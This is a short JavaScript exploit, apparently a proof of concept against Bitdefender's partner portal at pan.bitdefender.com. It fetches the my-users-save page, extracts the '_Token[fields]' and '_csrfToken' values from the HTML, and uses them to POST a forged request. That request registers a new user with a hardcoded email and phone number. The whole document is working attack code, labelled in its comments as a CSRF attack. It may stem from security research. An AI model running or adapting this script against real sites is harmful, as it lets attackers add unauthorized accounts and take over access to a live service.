// Handles the xhr response, parses the data, and extracts the CSRF token
function readBody(xhr) {
    var data;
    let data1;
    if (!xhr.responseType || xhr.responseType === "text") {
        data = xhr.responseText;
        data1 = xhr.responseText;
    } else if (xhr.responseType === "document") {
    data = xhr.responseXML;
    data1 = xhr.responseXML;    
    } else {
    data = xhr.response;
    data1 = xhr.response;
    }

    var parser = new DOMParser();
    var resp = parser.parseFromString(data, "text/html");
    var resp1 = parser.parseFromString(data1, "text/html");
    token = resp.getElementsByName("_Token[fields]")[0].value;
    key = resp1.getElementsByName("_csrfToken")[0].value;
    csrf(token,key);
    return [data, data1];
}

// Creates and sends the initial XHR request to the UsersPending page: this is to obtain the CSRF token
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function () {
    if (xhr.readyState == 4) {
        response = readBody(xhr);
    }
}

xhr.open("GET", "https://pan.bitdefender.com/partners/my-users-save/", true);
xhr.send(null);


// Sends the CSRF attack to POST data to the UsersPending section, using the previously obtained CSRF token
function csrf(token, key) {
    var params = "_Token%5Bfields%5D=" + token;
    params += "&fname=testus&";
    params += "lname=trying21&";
    params += "phone=&";
    params += "mobile_phone=0625638657&";
    params += "login=ihwoke@live.com&";
    params += "_Token%5Bunlocked%5D=&";
    params += "_csrfToken=" + key;

    var x1 = new XMLHttpRequest();
    x1.open("POST", "https://pan.bitdefender.com/partners/my-users-save/");
    x1.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    x1.send(params);
}
